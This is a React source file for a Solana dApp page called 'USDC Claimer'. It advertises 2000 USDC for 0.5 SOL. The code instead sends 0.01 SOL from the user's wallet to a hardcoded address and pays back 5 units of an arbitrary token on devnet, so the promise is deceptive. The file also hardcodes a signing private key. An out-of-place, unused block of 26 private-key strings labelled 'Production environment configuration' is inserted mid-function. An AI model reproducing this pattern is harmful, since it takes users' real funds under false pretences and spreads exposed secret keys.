/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5E2xB9dXmREsKu3p2GRDCcfEkhNWbspRf8BSrguMgynjZRL7kftJxNKsKsFRgGVx8Vn6Sn2PkUsqaUUqvPNXkpW"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3EXL7TFHGftAhD7nsZeMPjXbQufVBYz5PkjFsnTYWacwpk2LEZkjhhNBEyKofkm9dD8ND4KhBRqWe4iSfmUXNntj",
  "key1": "baxP88knzKQEdoED7wM82fEgHFXcpehGpLZhcDkx7pNvgWB2ECZ6CuacnCJ2XA8sKMFyx8NFktJAoUGauKLLkQY",
  "key2": "3KuzkVAkyYPjYSTzm5d1EhM4bzoexaX46kDv3Syha6NB7oWkCRp8g33dg6iR7zN37WyX5ABoBwwzzP23yh3K1a83",
  "key3": "53uX6zSqGfjBsE3hEM8Gx8GYQ36eT6v6dp5CCikRfjjYAa1HCnNKqdDVHXFK1Cq5dfY3MikjW3VkMeo7Zpa8Vcfu",
  "key4": "388RrbC6XNEQTmrGYL73yR4ohrtixYyvZ42rWttmAfQFgdigXv99kB9bP1xLtmtKpzt6nQuGawJNoTJ9vmqRKTKg",
  "key5": "5qn9xjKMivHDM7m7uVHcnHcENig41YcDobDWZRoFBkgY8zMuC41HoMhqRuELbqigLnqeisEtXANCXX6Dducf3sZa",
  "key6": "54scc9Zh7pPGRQ2kYRUfCxmxBdiJiSExxPnJHeofCWdbxaUbwFuEFxNpdQPrudQ8jmPjVhRxDJWurL6L5LKUTorj",
  "key7": "4aDgrd1Hzu2bswNPwyRRBzGUMZT7Ug3WkyP1mrzsnQgrNTt5peK6bQK6pwz9XkYaEoupPhv2Uuq2LoMQMnohRBnL",
  "key8": "2FxtRMt3mrAeQvFCCHAbjQARzFJkQUuS9mweHcF6fLrhrchYUpfFksoGHzdDAgT3J1VHeLgqC2HqzRZ4iAgLTj4v",
  "key9": "3ELt1rTLVXLdXQFqsHZ3NoGWcetoQa3VoeJaHxD8zBrwLWsrnBQfyvEpaDJPMVTCW2DLmSfEWWjMobPUTubrLsRh",
  "key10": "5HoZp8v3vDeWCMM18gg2oPXtvLoBFYdt6nf1XwshXyRTBN43EPiFjc4JppxjoMk7GGbzLpHLotsda4G2YUPf3J8r",
  "key11": "5zKVMpbL4Ciud6jXhykKgt4quzMwJMWMxhvRwtQEeTjo4obi8D9RqdbBXBB7QmckSEYQa6RyQC6UrSV12imwwTnY",
  "key12": "2yApU3yovkxWyxpXiH3Hm8wy8on2wRRSnXd8p477QJAyWvoLdx8iybvfpGLKmLvzK2UL2KQzdqRByVuizYk4KgRx",
  "key13": "3xMU6u9JdnudJDHQS8oEqaJBaCT665EcrTUiRJ6XrL5pHhBvWoFFznLpnWW1cXi2Z7ehA3UTeENHYrNCqxhnZU71",
  "key14": "2J9U41LWMqUPMDAoCH5LzsVP8Ud72YAZpbLMYhfXetGQ6XwK4Ne7XZtegZYfQDjtyc3pUhnC1EXheY377KRs7qNj",
  "key15": "4CU2VyaNcumDd2bkcC9SfrmGtUWbdtSEgmBEemTVqdVQTTg7acPUW8yjVtkYF9CVJQvaJG6v1nwV9mykXCZzXdhw",
  "key16": "3F7tJDFvRY2doGNtSWu3pSRcE3yp7D4Q6psDbfQCcQuwXDPreY3zbBEXYT1uFqPdbacnWZzMp2psy75e7S4uvCfr",
  "key17": "5BVbdFGXZS1aNwsnWZAh2GNcaKwRX1C9bERjUmA9ffTQqRAFmcpD17vSpVGa143WTnRLdguJsGaWEbwPdLXZYrJ8",
  "key18": "EFvjBVGj9VczogP77RLPmW3PLGoPc9sZvtQ8wTxKT6UGcaYc1wfVfFSBM6oFwimJZTmyURkbcGFRnMKJSjz8TAA",
  "key19": "6xPf8SLrUsYNdiHRSnkhW9M41ubQyFPTq5oKcV91RBRoUbeAviqA1oLyuGA8zGUCi7143vqvGefrehwWGpZJVAH",
  "key20": "kgX3EE2uoVF2V56fnqTWL9XkAgBfqQ1d3Au5Z2mDEp7BZ4APCkPyHJ5Z6dPmpHUe7R7P6rrP98EzxXgdyvmAj8F",
  "key21": "2nBBKEEmWFZiAeH3zYzveVd3oJnCDv6ikPpNnjLCiBZngJD5HEFPpuebgguP1ZP8Hwgis8ckEX4tDvMwg4EvmMtz",
  "key22": "4dhUF8rup3FR1uLrbzXxCkaE5N8fuQGj7tjXgsx6GK4HwcSySeJ77LrT3UpWvbWi6d5f5xUBG34gse3noMTjutbL",
  "key23": "ZVS2ueZsujDfs6cEXhAjrwMgPnEdbUWPp5BZgFF38JGpxo7JDFEMQd2KuXQGSF2LTaZmZWBggmS7dqMHpfA4upd",
  "key24": "2juuq5JM6vihYhQRovR1CCbnb2AS8om93V9i6vtXe9uZZZNtJaNXipukk8dUoGxHkvPSuvXukf6MRhQUs5FVLdoV",
  "key25": "acS8Vm4EmdJ8CZvAV68JWUFwb6c4H5juMtFWqK4oFCZkFJUXBQocwbHKEw74cbippokW9v7oEAVNRDEFNzWwnDj"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
